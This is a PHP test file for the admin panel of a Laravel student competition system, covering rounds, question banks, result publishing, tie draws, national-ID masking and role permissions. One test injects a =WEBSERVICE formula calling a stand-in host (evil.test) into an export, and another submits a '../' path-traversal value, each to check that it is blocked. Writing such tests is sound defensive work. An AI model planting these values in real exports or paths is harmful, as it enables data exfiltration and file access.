<?php

use App\Actions\Competitions\DeleteStudentCompetitionItem;
use App\Actions\Competitions\ImportStudentQuestions;
use App\Actions\Competitions\IssueCompetitionCertificates;
use App\Actions\Competitions\PublishRoundResults;
use App\Actions\Competitions\QualifyAttempts;
use App\Actions\Competitions\RevealStudentIdentity;
use App\Actions\Competitions\RunTieDraw;
use App\Actions\Competitions\SaveCompetition;
use App\Actions\Competitions\SaveCompetitionField;
use App\Actions\Competitions\SaveCompetitionPassage;
use App\Actions\Competitions\SaveCompetitionRound;
use App\Actions\Competitions\SaveStudentQuestion;
use App\Actions\Competitions\StartAttempt;
use App\Actions\Competitions\SubmitAttempt;
use App\Enums\AttemptStatus;
use App\Enums\PassageKind;
use App\Enums\QuestionType;
use App\Enums\RoleName;
use App\Filament\Resources\CompetitionCategories\CompetitionCategoryResource;
use App\Filament\Resources\CompetitionRegions\CompetitionRegionResource;
use App\Filament\Resources\Competitions\CompetitionResource;
use App\Filament\Resources\Competitions\Pages\EditCompetition;
use App\Filament\Resources\Competitions\Pages\ViewCompetition;
use App\Filament\Resources\Competitions\RelationManagers\DrawsRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\FieldsRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\PassagesRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\QuestionBankRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\RegistrationsRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\ResultsRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\RoundsRelationManager;
use App\Filament\Resources\Competitions\RelationManagers\SubmissionsRelationManager;
use App\Jobs\GenerateCompetitionCertificate;
use App\Models\Competition;
use App\Models\CompetitionAttempt;
use App\Models\CompetitionDraw;
use App\Models\CompetitionPassage;
use App\Models\CompetitionQuestion;
use App\Models\CompetitionSubmission;
use App\Models\User;
use App\Support\StudentQuestionsSheet;
use App\Support\StudentResultsSheet;
use Filament\Actions\Testing\TestAction;
use Illuminate\Auth\Access\AuthorizationException;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Illuminate\Testing\TestResponse;
use Illuminate\Validation\ValidationException;
use Livewire\Livewire;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Reader\XLSX\Reader;
use OpenSpout\Writer\XLSX\Writer;
use Spatie\Activitylog\Models\Activity;

/*
| مسابقة الطلاب من جهة اللوحة (docs/plans/student-competition.md): المراحل والبنك وأقفالهما، والاستيراد والتصدير،
| ونشر النتائج، والسحب بين المتساوين، ورقم الهوية الكامل لمن يملكه وحده، والشهادات، وظهور الصفحات بالأدوار.
*/

beforeEach(function () {
    config(['competitions.exam.national_id_key' => 'test-hmac-key']);

    $this->director = userWithRole(RoleName::ExecutiveDirector);
    $this->manager = userWithRole(RoleName::ProgramManager);
    $this->competition = Competition::factory()->student()->create(['slug' => 'students', 'created_by' => $this->manager->id]);
    $this->round = $this->competition->rounds()->firstOrFail();
});

/**
 * محاولة مسلَّمة بدرجة معينة لطالب جديد.
 */
function submittedWithScore(int $serial, float $score): CompetitionAttempt
{
    $student = registeredStudent(test()->competition, $serial);
    $attempt = app(StartAttempt::class)->handle($student, test()->round);
    app(SubmitAttempt::class)->handle($student, $attempt);
    $attempt->forceFill(['score' => $score])->save();

    return $attempt->fresh();
}

/**
 * @param  list<list<string|int>>  $rows
 */
function questionsXlsx(array $rows): string
{
    $path = tempnam(sys_get_temp_dir(), 'q').'.xlsx';
    $writer = new Writer;
    $writer->openToFile($path);
    $writer->addRow(Row::fromValues(['النوع', 'الفئة', 'النص', 'السؤال', '1', '2', '3', '4', '5', '6', 'الصحيح', 'الدرجة']));

    foreach ($rows as $row) {
        $writer->addRow(Row::fromValues($row));
    }

    $writer->close();

    return $path;
}

/**
 * @return list<list<string>>
 */
function readXlsx(string $contents): array
{
    $path = tempnam(sys_get_temp_dir(), 'r').'.xlsx';
    file_put_contents($path, $contents);
    $reader = new Reader;
    $reader->open($path);
    $rows = [];

    foreach ($reader->getSheetIterator() as $sheet) {
        foreach ($sheet->getRowIterator() as $row) {
            $rows[] = array_map(fn ($value): string => (string) $value, $row->toArray());
        }
    }

    $reader->close();

    return $rows;
}

it('creates a student competition through the save action, recording its creator and open categories', function () {
    $competition = app(SaveCompetition::class)->handle($this->director, new Competition, [
        'title' => 'مسابقة تجريبية',
        'slug' => 'trial-students',
        'opens_at' => now()->toDateTimeString(),
        'closes_at' => now()->addWeek()->toDateTimeString(),
        'student_mode' => true,
        'open_categories' => [$this->competition->openCategories()->first()->id],
        'is_published' => false,
    ]);

    expect($competition->student_mode)->toBeTrue()
        ->and($competition->created_by)->toBe($this->director->id)
        ->and($competition->openCategories()->count())->toBe(1);

    expect(fn () => app(SaveCompetition::class)->handle($this->director, $competition, ['title' => 'x', 'slug' => 'trial-students', 'opens_at' => now(), 'closes_at' => now()->addDay(), 'student_mode' => true, 'exam_mode' => true]))
        ->toThrow(ValidationException::class);
});

it('keeps the classic question bank to its classic types', function () {
    $works = Competition::factory()->create();

    expect(fn () => app(SaveCompetition::class)->handle($this->director, $works, [
        'title' => $works->title, 'slug' => $works->slug, 'opens_at' => $works->opens_at, 'closes_at' => $works->closes_at,
        'questions' => [['type' => 'true_false', 'prompt' => 'س', 'is_required' => true]],
    ]))->toThrow(ValidationException::class);
});

it('does not let the competition form touch the round question bank', function () {
    $question = studentQuestion($this->round);

    app(SaveCompetition::class)->handle($this->manager, $this->competition, [
        'title' => $this->competition->title, 'slug' => 'students', 'opens_at' => $this->competition->opens_at, 'closes_at' => $this->competition->closes_at,
        'questions' => [],
    ]);

    expect(CompetitionQuestion::query()->whereKey($question->id)->exists())->toBeTrue();
});

it('adds rounds from the panel and locks their start, count and duration after the first attempt', function () {
    $this->actingAs($this->manager);

    Livewire::test(RoundsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])
        ->assertOk()
        ->callAction(TestAction::make('create')->table(), [
            'name' => 'المرحلة الثانية', 'sort_order' => 2,
            'starts_at' => now()->addDays(10)->format('Y-m-d H:i'), 'ends_at' => now()->addDays(11)->format('Y-m-d H:i'),
            'question_count' => 35, 'duration_minutes' => 40, 'qualified_only' => true,
        ])
        ->assertHasNoActionErrors();

    expect($this->competition->rounds()->count())->toBe(2);

    studentQuestion($this->round);
    app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);

    $data = ['name' => 'اسم جديد', 'starts_at' => $this->round->starts_at, 'ends_at' => $this->round->ends_at->copy()->addHour(), 'question_count' => $this->round->question_count, 'duration_minutes' => 30];
    $saved = app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $this->round, $data);
    expect($saved->name)->toBe('اسم جديد');

    expect(fn () => app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $this->round, [...$data, 'duration_minutes' => 45]))->toThrow(ValidationException::class);

    Livewire::test(RoundsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])
        ->assertActionHidden(TestAction::make('delete')->table($this->round));
});

it('validates student questions and locks the bank after the first attempt', function () {
    $save = app(SaveStudentQuestion::class);
    $base = ['type' => 'multiple_choice', 'prompt' => 'سؤال', 'points' => 1];

    expect(fn () => $save->handle($this->manager, $this->round, null, [...$base, 'options' => [['label' => 'أ', 'is_correct' => true]]]))->toThrow(ValidationException::class)
        ->and(fn () => $save->handle($this->manager, $this->round, null, [...$base, 'options' => [['label' => 'أ', 'is_correct' => true], ['label' => 'ب', 'is_correct' => true]]]))->toThrow(ValidationException::class)
        ->and(fn () => $save->handle($this->manager, $this->round, null, ['type' => 'true_false', 'prompt' => 'س', 'points' => 1]))->toThrow(ValidationException::class)
        ->and(fn () => $save->handle($this->manager, $this->round, null, ['type' => 'passage_choice', 'prompt' => 'س', 'points' => 1, 'options' => [['label' => 'أ', 'is_correct' => true], ['label' => 'ب']]]))->toThrow(ValidationException::class)
        // المقالي مطفأ بقرار المدير
        ->and(fn () => $save->handle($this->manager, $this->round, null, ['type' => 'essay', 'prompt' => 'س', 'points' => 1]))->toThrow(ValidationException::class)
        ->and(fn () => $save->handle(userWithRole(RoleName::BoardMember), $this->round, null, [...$base, 'options' => [['label' => 'أ', 'is_correct' => true], ['label' => 'ب']]]))->toThrow(AuthorizationException::class);

    $tf = $save->handle($this->manager, $this->round, null, ['type' => 'true_false', 'prompt' => 'الماء يغلي', 'points' => 1, 'true_false' => 'f']);
    expect($tf->optionKeys())->toBe(['t', 'f'])->and($tf->correct_option)->toBe('f');

    $video = new CompetitionPassage(['round_id' => $this->round->id, 'kind' => PassageKind::Video, 'video_url' => 'https://www.youtube.com/watch?v=dQw4w9WgXcQ']);
    $video->competition_id = $this->competition->id;
    $video->save();
    $onVideo = $save->handle($this->manager, $this->round, null, ['type' => 'video_choice', 'prompt' => 'عن المقطع', 'points' => 2, 'passage_id' => $video->id, 'options' => [['label' => 'أ'], ['label' => 'ب', 'is_correct' => true]]]);
    expect($onVideo->passage_id)->toBe($video->id)->and($onVideo->correct_option)->toBe('b');

    $this->round->forceFill(['question_count' => $this->round->questions()->count()])->save();
    app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);

    expect(fn () => $save->handle($this->manager, $this->round, $tf, ['type' => 'true_false', 'prompt' => 'تعديل', 'points' => 1, 'true_false' => 't']))->toThrow(ValidationException::class);
});

it('imports a question bank from Excel all or nothing, and exports it back', function () {
    $good = questionsXlsx([
        ['اختيار من متعدد', '', '', 'سؤال مستورد', 'أ', 'ب', 'ج', '', '', '', '2', '3'],
        ['صح وخطأ', 'المرحلة الثانوية', '', 'عبارة مستوردة', '', '', '', '', '', '', 'صح', ''],
    ]);
    $bad = questionsXlsx([
        ['اختيار من متعدد', '', '', 'سؤال صالح', 'أ', 'ب', '', '', '', '', '1', '1'],
        ['اختيار من متعدد', '', '', 'بلا صحيح', 'أ', 'ب', '', '', '', '', '', '1'],
    ]);

    expect(fn () => app(ImportStudentQuestions::class)->handle($this->manager, $this->round, $bad))->toThrow(ValidationException::class)
        ->and($this->round->questions()->count())->toBe(0);

    expect(app(ImportStudentQuestions::class)->handle($this->manager, $this->round, $good))->toBe(2);

    $mcq = $this->round->questions()->where('prompt', 'سؤال مستورد')->sole();
    expect($mcq->correct_option)->toBe('b')->and($mcq->points)->toBe(3)
        ->and($this->round->questions()->where('type', QuestionType::TrueFalse)->sole()->correct_option)->toBe('t');

    $this->actingAs($this->manager);
    $download = Livewire::test(QuestionBankRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])
        ->callAction(TestAction::make('export')->table(), ['round_id' => $this->round->id])
        ->assertFileDownloaded('questions-'.$this->round->uuid.'.xlsx');
});

it('publishes results only after the round ends, for those who may approve, submitting what is still running', function () {
    studentQuestion($this->round);
    $running = app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);

    expect(fn () => app(PublishRoundResults::class)->handle($this->manager, $this->round))->toThrow(ValidationException::class);

    $this->travel(4)->hours();

    expect(fn () => app(PublishRoundResults::class)->handle(userWithRole(RoleName::BoardMember), $this->round))->toThrow(AuthorizationException::class);

    $published = app(PublishRoundResults::class)->handle($this->manager, $this->round);

    expect($published->results_published_at)->not->toBeNull()
        ->and($running->fresh()->status)->toBe(AttemptStatus::Submitted)
        ->and(Activity::query()->where('event', 'round_results_published')->exists())->toBeTrue();
});

it('draws among students tied at the prize boundary, recording a draw that never changes on a second press', function () {
    studentQuestion($this->round);
    $top = submittedWithScore(1, 9);
    collect([2, 3, 4])->each(fn (int $serial) => submittedWithScore($serial, 7));
    submittedWithScore(5, 3);
    $this->travel(4)->hours();
    $this->round->forceFill(['results_published_at' => now()])->save();

    [$draw, $fresh] = app(RunTieDraw::class)->handle($this->manager, $this->round, null, 3);

    expect($fresh)->toBeTrue()
        ->and($draw->entrants_count)->toBe(3)
        ->and($draw->winners)->toHaveCount(2)
        ->and((float) $draw->tie_score)->toBe(7.0)
        ->and($draw->winners)->not->toContain($top->submission->reference)
        ->and($draw->seed)->toMatch('/^[0-9a-f]{64}$/');

    [$again, $freshAgain] = app(RunTieDraw::class)->handle($this->manager, $this->round, null, 3);
    expect($freshAgain)->toBeFalse()->and($again->id)->toBe($draw->id)->and(CompetitionDraw::query()->count())->toBe(1);

    $this->artisan('ejaz:verify-draw', ['uuid' => $draw->uuid])->assertSuccessful();

    expect(fn () => app(RunTieDraw::class)->handle(userWithRole(RoleName::BoardMember), $this->round, null, 3))->toThrow(AuthorizationException::class);
});

it('refuses a tie draw when nobody is tied at the boundary', function () {
    studentQuestion($this->round);
    submittedWithScore(1, 9);
    submittedWithScore(2, 7);
    submittedWithScore(3, 5);
    $this->travel(4)->hours();
    $this->round->forceFill(['results_published_at' => now()])->save();

    expect(fn () => app(RunTieDraw::class)->handle($this->manager, $this->round, null, 1))->toThrow(ValidationException::class)
        ->and(CompetitionDraw::query()->count())->toBe(0);
});

it('shows the full national ID only to the competition creator and the executive director, logging every view', function () {
    $student = registeredStudent($this->competition, 4);
    $submission = CompetitionSubmission::query()->where('user_id', $student->id)->sole();

    expect(app(RevealStudentIdentity::class)->handle($this->director, $submission)['national_id'])->toBe(studentNationalId(4))
        ->and(app(RevealStudentIdentity::class)->handle($this->manager, $submission)['national_id'])->toBe(studentNationalId(4))
        ->and(Activity::query()->where('event', 'national_id_viewed')->count())->toBe(2)
        ->and(Activity::query()->where('event', 'national_id_viewed')->get()->pluck('properties')->flatten()->implode(' '))->not->toContain(studentNationalId(4));

    foreach ([userWithRole(RoleName::ProgramManager), userWithRole(RoleName::SuperAdmin), userWithRole(RoleName::BoardMember)] as $user) {
        expect(fn () => app(RevealStudentIdentity::class)->handle($user, $submission))->toThrow(AuthorizationException::class);
    }

    $this->actingAs(userWithRole(RoleName::ProgramManager));
    Livewire::test(RegistrationsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
        ->assertOk()
        ->assertSee(CompetitionSubmission::mask(studentNationalId(4)))
        ->assertDontSee(studentNationalId(4))
        ->assertActionHidden(TestAction::make('reveal')->table($submission));

    // فتح نافذة الاطلاع وحده يقرأ الرقم ويسجّل الاطلاع، والجدول لا يحمله
    $this->actingAs($this->director);
    Livewire::test(RegistrationsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
        ->assertDontSee(studentNationalId(4))
        ->assertActionVisible(TestAction::make('reveal')->table($submission))
        ->mountAction(TestAction::make('reveal')->table($submission));

    expect(Activity::query()->where('event', 'national_id_viewed')->count())->toBe(3);
});

it('exports results with the national ID masked unless the exporter may see it in full', function () {
    studentQuestion($this->round);
    submittedWithScore(6, 4);
    $query = fn () => $this->competition->attempts()->getQuery();

    $content = fn (User $user): string => TestResponse::fromBaseResponse(StudentResultsSheet::download($user, $this->competition, $query()))->streamedContent();
    $masked = readXlsx($content(userWithRole(RoleName::ProgramManager)));
    $full = readXlsx($content($this->director));

    expect($masked)->toHaveCount(2)
        ->and(implode(' ', $masked[1]))->not->toContain(studentNationalId(6))->toContain(substr(studentNationalId(6), -4))
        ->and(implode(' ', $full[1]))->toContain(studentNationalId(6))
        ->and(Activity::query()->where('event', 'competition_results_exported')->count())->toBe(2);
});

it('issues certificates to participants who submitted, generating a PDF each', function () {
    Storage::fake('local');
    studentQuestion($this->round);
    $participant = submittedWithScore(1, 1);
    registeredStudent($this->competition, 2);
    Queue::fake();

    expect(app(IssueCompetitionCertificates::class)->handle($this->manager, $this->competition))->toBe(1);
    Queue::assertPushed(GenerateCompetitionCertificate::class, 1);

    (new GenerateCompetitionCertificate($participant->submission_id))->handle();
    $submission = $participant->submission->fresh();

    expect($submission->certificate_path)->not->toBeNull()
        ->and(Storage::disk('local')->get($submission->certificate_path))->toStartWith('%PDF');

    expect(fn () => app(IssueCompetitionCertificates::class)->handle(userWithRole(RoleName::BoardMember), $this->competition))->toThrow(AuthorizationException::class);

    app()->detectEnvironment(fn () => 'production');
    expect(fn () => app(IssueCompetitionCertificates::class)->handle($this->manager, $this->competition))->toThrow(ValidationException::class);
});

it('shows the student pages in the panel for a student competition only, by role', function () {
    $this->actingAs($this->manager);
    $this->get(CompetitionResource::getUrl('edit', ['record' => $this->competition]))->assertOk();

    foreach ([RoundsRelationManager::class, QuestionBankRelationManager::class, PassagesRelationManager::class, FieldsRelationManager::class, RegistrationsRelationManager::class, ResultsRelationManager::class] as $manager) {
        expect($manager::canViewForRecord($this->competition, EditCompetition::class))->toBeTrue();
        Livewire::test($manager, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])->assertOk();
    }

    expect(SubmissionsRelationManager::canViewForRecord($this->competition, EditCompetition::class))->toBeFalse()
        ->and(RoundsRelationManager::canViewForRecord(Competition::factory()->create(), EditCompetition::class))->toBeFalse();

    $this->get(CompetitionCategoryResource::getUrl())->assertOk()->assertSee('المرحلة المتوسطة');
    $this->get(CompetitionRegionResource::getUrl())->assertOk()->assertSee('منطقة مكة المكرمة');

    // عضو المجلس يطّلع على المسابقة ومراحلها، ولا يرى النتائج ولا المسجلين (بياناتهم الشخصية)
    $this->actingAs(userWithRole(RoleName::BoardMember));
    expect(RoundsRelationManager::canViewForRecord($this->competition, ViewCompetition::class))->toBeTrue()
        ->and(ResultsRelationManager::canViewForRecord($this->competition, ViewCompetition::class))->toBeFalse()
        ->and(RegistrationsRelationManager::canViewForRecord($this->competition, ViewCompetition::class))->toBeFalse();

    $this->actingAs(User::factory()->create());
    $this->get(CompetitionResource::getUrl('edit', ['record' => $this->competition]))->assertForbidden();
});

it('qualifies submitted attempts for the next round from the results', function () {
    studentQuestion($this->round);
    $attempt = submittedWithScore(1, 5);
    $this->actingAs($this->manager);

    // قبل النشر يُرفض، لأن التأهل يكشف النتيجة
    expect(fn () => app(QualifyAttempts::class)->handle($this->manager, $this->round, [$attempt->id]))->toThrow(ValidationException::class);
    $this->round->forceFill(['results_published_at' => now()])->save();

    Livewire::test(ResultsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => EditCompetition::class])
        ->selectTableRecords([$attempt->id])
        ->callAction(TestAction::make('qualify')->table()->bulk())
        ->assertNotified(__('competitions.student.admin.qualified_count', ['count' => 1]));

    expect($attempt->fresh()->qualified_at)->not->toBeNull()
        ->and(Activity::query()->where('event', 'attempts_qualified')->exists())->toBeTrue();
});

it('writes spreadsheet cells that start like formulas as plain text', function () {
    $field = $this->competition->fields()->create(['label' => 'المدرسة', 'type' => 'text', 'is_required' => false, 'sort_order' => 1]);
    studentQuestion($this->round);
    $student = registeredStudent($this->competition, 8, ['fields' => [$field->id => '=WEBSERVICE("https://evil.test")']]);
    $attempt = app(StartAttempt::class)->handle($student, $this->round);
    app(SubmitAttempt::class)->handle($student, $attempt);

    $rows = readXlsx(TestResponse::fromBaseResponse(StudentResultsSheet::download($this->director, $this->competition, $this->competition->attempts()->getQuery()))->streamedContent());

    expect(implode(' ', $rows[1]))->toContain("'=WEBSERVICE");
});

it('does not let a round end move earlier once students have started', function () {
    studentQuestion($this->round);
    app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);
    $data = ['name' => $this->round->name, 'starts_at' => $this->round->starts_at, 'ends_at' => $this->round->ends_at->copy()->subHour(), 'question_count' => $this->round->question_count, 'duration_minutes' => 30];

    expect(fn () => app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $this->round, $data))->toThrow(ValidationException::class);
});

it('rejects a certificate background path outside its folder', function () {
    expect(fn () => app(SaveCompetition::class)->handle($this->manager, $this->competition, [
        'title' => $this->competition->title, 'slug' => 'students', 'opens_at' => $this->competition->opens_at, 'closes_at' => $this->competition->closes_at,
        'certificate_background' => 'competition-certificate-templates/../competition-certificates/x.png',
    ]))->toThrow(ValidationException::class);
});

it('keeps a tie draw out of the void action and out of the competition schedule lock', function () {
    studentQuestion($this->round);
    collect([1, 2, 3])->each(fn (int $serial) => submittedWithScore($serial, 7));
    $this->travel(4)->hours();
    $this->round->forceFill(['results_published_at' => now()])->save();
    [$draw] = app(RunTieDraw::class)->handle($this->manager, $this->round, null, 2);

    expect($this->competition->fresh()->scheduleLocked())->toBeFalse();

    $this->actingAs(userWithRole(RoleName::SuperAdmin));
    Livewire::test(DrawsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
        ->assertActionHidden(TestAction::make('void')->table($draw));

    $this->artisan('ejaz:verify-draw', ['uuid' => $draw->uuid])->assertSuccessful()->expectsOutputToContain('كما كانت عند السحب');
});

it('locks the round window once results are published, and the qualified-only rule after the first attempt', function () {
    studentQuestion($this->round);
    app(StartAttempt::class)->handle(registeredStudent($this->competition), $this->round);
    $data = fn (array $overrides = []): array => ['name' => $this->round->name, 'starts_at' => $this->round->starts_at, 'ends_at' => $this->round->ends_at, 'question_count' => $this->round->question_count, 'duration_minutes' => 30, ...$overrides];

    expect(fn () => app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $this->round, $data(['qualified_only' => true])))->toThrow(ValidationException::class);

    $this->travel(4)->hours();
    app(PublishRoundResults::class)->handle($this->manager, $this->round);
    $round = $this->round->fresh();

    expect(fn () => app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $round, $data(['ends_at' => $round->ends_at->copy()->addDay()])))->toThrow(ValidationException::class)
        ->and(app(SaveCompetitionRound::class)->handle($this->manager, $this->competition, $round, $data(['name' => 'اسم آخر']))->name)->toBe('اسم آخر');
});

it('refuses to publish while a student is still within time, and submits only attempts whose time is over', function () {
    studentQuestion($this->round);
    $late = app(StartAttempt::class)->handle(registeredStudent($this->competition, 1), $this->round);
    $running = app(StartAttempt::class)->handle(registeredStudent($this->competition, 2), $this->round);
    $this->travel(4)->hours();
    // خلل مفترض: موعد محاولة بعد النهاية (لا يقع إلا بخلل)، فالنشر يرفض ولا يقطع على صاحبها
    $running->forceFill(['deadline_at' => now()->addMinutes(10)])->save();

    expect(fn () => app(PublishRoundResults::class)->handle($this->manager, $this->round))->toThrow(ValidationException::class)
        ->and($running->fresh()->isInProgress())->toBeTrue()
        ->and($late->fresh()->isInProgress())->toBeTrue();

    $running->forceFill(['deadline_at' => now()->subMinute()])->save();
    app(PublishRoundResults::class)->handle($this->manager, $this->round);

    expect($late->fresh()->isInProgress())->toBeFalse()->and($running->fresh()->auto_submitted)->toBeTrue();
});

it('draws only after publication, with the recorded number of places, and among equal maximum scores', function () {
    studentQuestion($this->round);
    collect([1, 2, 3])->each(fn (int $serial) => submittedWithScore($serial, 7));
    $this->travel(4)->hours();

    expect(fn () => app(RunTieDraw::class)->handle($this->manager, $this->round, null, 2))->toThrow(ValidationException::class);

    $this->round->forceFill(['results_published_at' => now()])->save();
    app(RunTieDraw::class)->handle($this->manager, $this->round, null, 2);

    expect(fn () => app(RunTieDraw::class)->handle($this->manager, $this->round, null, 1))->toThrow(ValidationException::class)
        ->and(CompetitionDraw::query()->count())->toBe(1);

    $category = $this->competition->openCategories()->where('name', 'المرحلة الثانوية')->value('competition_categories.id');
    CompetitionAttempt::query()->latest('id')->first()->forceFill(['max_score' => 99])->save();

    expect(fn () => app(RunTieDraw::class)->handle($this->manager, $this->round, (int) $category, 2))->toThrow(ValidationException::class);
});

it('keeps the super admin read-only on every student competition write', function () {
    $super = userWithRole(RoleName::SuperAdmin);
    studentQuestion($this->round);
    $attempt = submittedWithScore(1, 5);
    $this->travel(4)->hours();
    $roundData = ['name' => 'م', 'starts_at' => now(), 'ends_at' => now()->addDay(), 'question_count' => 1, 'duration_minutes' => 30];
    $choice = ['type' => 'multiple_choice', 'prompt' => 'س', 'points' => 1, 'options' => [['label' => 'أ', 'is_correct' => true], ['label' => 'ب']]];

    $writes = [
        fn () => app(SaveCompetitionRound::class)->handle($super, $this->competition, null, $roundData),
        fn () => app(SaveStudentQuestion::class)->handle($super, $this->round, null, $choice),
        fn () => app(SaveCompetitionPassage::class)->handle($super, $this->round, null, ['kind' => 'text', 'body' => 'نص']),
        fn () => app(SaveCompetitionField::class)->handle($super, $this->competition, null, ['label' => 'ح', 'type' => 'text']),
        fn () => app(DeleteStudentCompetitionItem::class)->handle($super, $this->round),
        fn () => app(PublishRoundResults::class)->handle($super, $this->round),
        fn () => app(QualifyAttempts::class)->handle($super, $this->round, [$attempt->id]),
        fn () => app(RunTieDraw::class)->handle($super, $this->round, null, 1),
        fn () => app(IssueCompetitionCertificates::class)->handle($super, $this->competition),
        fn () => StudentResultsSheet::download($super, $this->competition, $this->competition->attempts()->getQuery()),
        fn () => StudentQuestionsSheet::download($super, $this->round),
    ];

    foreach ($writes as $write) {
        expect($write)->toThrow(AuthorizationException::class);
    }

    $this->actingAs($super);
    Livewire::test(RoundsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
        ->assertActionHidden(TestAction::make('create')->table())
        ->assertActionHidden(TestAction::make('publish')->table($this->round));
    Livewire::test(ResultsRelationManager::class, ['ownerRecord' => $this->competition, 'pageClass' => ViewCompetition::class])
        ->assertActionHidden(TestAction::make('export')->table())
        ->assertActionHidden(TestAction::make('tie_draw')->table())
        ->assertActionHidden(TestAction::make('certificates')->table());
});

it('checks the permission inside both spreadsheet downloads, whatever the button shows', function () {
    $board = userWithRole(RoleName::BoardMember);

    expect(fn () => StudentResultsSheet::download($board, $this->competition, $this->competition->attempts()->getQuery()))->toThrow(AuthorizationException::class)
        ->and(fn () => StudentQuestionsSheet::download($board, $this->round))->toThrow(AuthorizationException::class)
        ->and(StudentQuestionsSheet::download($this->manager, $this->round)->getStatusCode())->toBe(200);
});
